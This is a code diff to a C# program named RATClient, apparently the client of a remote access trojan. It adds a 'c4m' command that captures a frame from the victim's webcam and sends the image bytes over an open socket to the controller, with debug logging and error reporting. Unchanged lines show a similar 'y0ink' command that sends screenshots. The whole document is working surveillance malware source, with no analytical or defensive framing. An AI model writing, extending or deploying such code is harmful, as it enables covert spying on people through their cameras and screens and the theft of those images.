@@ -103,6 +103,9 @@ namespace RATClient
             }else if (recvString.StartsWith("y0ink"))
             {
                 sendScreenshot();
+            }else if (recvString.StartsWith("c4m"))
+            {
+                captureWebcam();
             }
         }
 
@@ -222,14 +225,32 @@ namespace RATClient
         }
         static void captureWebcam()
         {
-            WebCamService.Capture capture = new WebCamService.Capture();
-            capture.Start();
-            IntPtr image = capture.GetBitMap();
-            Bitmap imageBitmap = new Bitmap(capture.Width, capture.Height, capture.Stride, PixelFormat.DontCare, image);
-            ImageConverter converter = new ImageConverter();
-            byte[] imgBytes = (byte[])converter.ConvertTo(imageBitmap, typeof(byte[]));
-            openSock.Send(imgBytes);
-            capture.Dispose();
+            Console.WriteLine("Entered webcam capture");
+            try
+            {
+                WebCamService.Capture capture = new WebCamService.Capture();
+                capture.Start();
+                Console.WriteLine("Capture started");
+                IntPtr image = capture.GetBitMap();
+                Console.WriteLine("Image captured");
+                Bitmap imageBitmap = new Bitmap(capture.Width, capture.Height, capture.Stride, PixelFormat.DontCare, image);
+                Console.WriteLine("Converted to bitmap");
+                ImageConverter converter = new ImageConverter();
+                byte[] imgBytes = (byte[])converter.ConvertTo(imageBitmap, typeof(byte[]));
+                Console.WriteLine("Converted to byte[]");
+                openSock.Send(imgBytes);
+                Console.WriteLine("Image sent");
+                capture.Dispose();
+                Console.WriteLine("Capture closed.");
+            }catch(Exception e)
+            {
+                Console.WriteLine("Error occured in webcam processing: ");
+                Console.WriteLine(e);
+                byte[] errorBytes = Encoding.ASCII.GetBytes("webcamError♦");
+                openSock.Send(errorBytes);
+                Console.WriteLine("Error sent.");
+            }
+            
         }
         static void Main(string[] args)
         {
